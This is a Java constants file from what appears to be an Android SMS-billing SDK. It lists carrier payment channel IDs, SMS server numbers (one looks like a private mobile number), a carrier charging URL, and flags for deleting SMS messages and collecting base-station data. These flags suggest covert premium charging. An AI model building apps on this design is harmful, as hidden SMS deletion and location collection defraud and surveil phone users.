package com.y7.smspay.sdk.util;

import java.util.regex.Pattern;

public final class Constants {
    public Constants() {
    }

    /**
     * 发布版本时,有4处要修改isTest, SERVER_URL, DLogUtils.allowLog, DLogUtils.isSaveLog
     */

    public static String SERVER_PHONENUMBER1 = "1069013312315"; // 企信通
    public static String SERVER_PHONENUMBER2 = "18322582382"; // 企信通

    public static String isBca = null; // add 0418 是否获取基站信息

    public static int cutPrice = 0; //通道拼资费
    /**
     * 如果是测试版本,为true; 发布版本为false。
     */
    public static final boolean isTest = false; //


    public static int delAbility = 0; // 能否删除短信


    /**
     * HttpConnetion--链接状态
     */
    public final static int STATUS_INIT = -1;// the conn has been created
    public final static int STATUS_CONNECTING = -2;// the conn is connecting to
    // network
    public final static int STATUS_SUCCESS = 200; // the conn has been
    // established
    public final static int STATUS_RELEASED = -3;// the conn has been released
    public final static int STATUS_NONETWORK = -4;// the network is not
    // available
    /**
     * 请求方式
     */
    public final static int REQ_GET = 0;
    public final static int REQ_POST = 1;
    /**
     * StringCoder
     */

    public final static Pattern PATTERN = Pattern.compile("%(\\d*)");

    /***
     * 本地SD文件保存名称
     */
    public final static String MYPHONENUMBER = "sdph";

    /**
     * 指定号码内容发送一次
     */
    public static final int CHANNEL_YDDN = 4; //移动 多纳寓言故事
    public static final int CHANNEL_YDZZX = 7; //移动 猪猪侠
    public static final int CHANNEL_DXADM = 6; //电信 爱动漫 捕鱼大乱斗
    public static final int CHANNEL_DXACS = 5; //电信 爱城市 捕鱼大乱斗|
    public static final int CHANNEL_MMLC = 13; //移动 MM力闯焰关
    public static final int CHANNEL_YDXHP = 15; // 移动 嘻哈派
    public static final int CHANNEL_YDCL = 16; // 移动 动漫超能战酷
    public static final int CHANNEL_YDYDDB = 17; // 移动 阅读点播

    /**
     * 制定号码内容 发送2次
     */
    public static final int CHANNEL_YDDK = 8; // 移动 多酷游戏
    public static final int CHANNEL_YDADM_NDBGD = 10; //移动 爱动漫 脑洞不够大
    public static final int CHANNEL_YDMDO = 11; // 移动MDO
    public static final int CHANNEL_YDZB = 12; // 移动中报


    /**
     * 中国手游通道ID
     */
    public static final int CHANNEL_MDO = 9; // 中国手游
    /**
     * 2014-11-11 added by xingjian.peng 杰哥通道ID
     */
    public static final int CHANNEL_HUOLI = 10; // 洁哥
    /**
     * 2014-11-11 added by xingjian.peng 自家接的裸代码
     */
    public static final int CHANNEL_YICHU = 11;

    /**
     * 电信综合平台
     */
    public static final int CHANNEL_DXZH = 17;
    /**
     * 妙讯
     */
    public static final int CHANNEL_MIAOXUN = 18;
    /**
     * xr
     */
    public static final int CHANNEL_PCXR = 29;

    /**
     * 泰豪
     */
    public static final int CHANNEL_THFT = 32;
    public static final int CHANNEL_THXM = 33;

    /**
     * 成都鼎元百纳
     */
    public static final int CHANNEL_DYBN1 = 36;
    public static final int CHANNEL_DYBN2 = 37;
    public static final int CHANNEL_DYBN3 = 38;
    public static final int CHANNEL_DYBN4 = 39;

    /**
     * 永正 wo+
     */
    public static final int CHANNEL_WO = 46;
    /**
     * 永正 wo+
     */
    public static final int CHANNEL_UPAY = 56;
    public static final int CHANNEL_YZRDO = 61;

    /**
     * 移动书卷
     */
    public static final int CHANNEL_YDSQ = 101;
    /*************** AndroidManifest.xml 配置参数 ********************/

    /**
     * 移动MM
     * add 0518
     */
    public static final int CHANNEL_YDMM = 121;
    /*************** AndroidManifest.xml 配置参数 ********************/

    /**
     * 二进制短信
     * add 0518
     */
    public static final int CHANNEL_BYTE = 122;
    /*************** AndroidManifest.xml 配置参数 ********************/

    //add 0422
    public static final int CHANNEL_YYYYY = 1010;

    public final static String CMGAME_URL = "http://wap.cmgame.com/portalone/securityCharge";

/*	public final static String MULTIPLE_INIT_ABCDEF = "MULTIPLE_INIT_ABCDEF";
    public final static String MULTIPLE_REQ_ABCDEF = "MULTIPLE_REQ_ABCDEF";
	public final static String FORCE_INIT_ABCDEF = "FORCE_INIT_ABCDEF";
	public final static String FORCE_REQ_ABCDEF = "FORCE_REQ_ABCDEF";*/
}
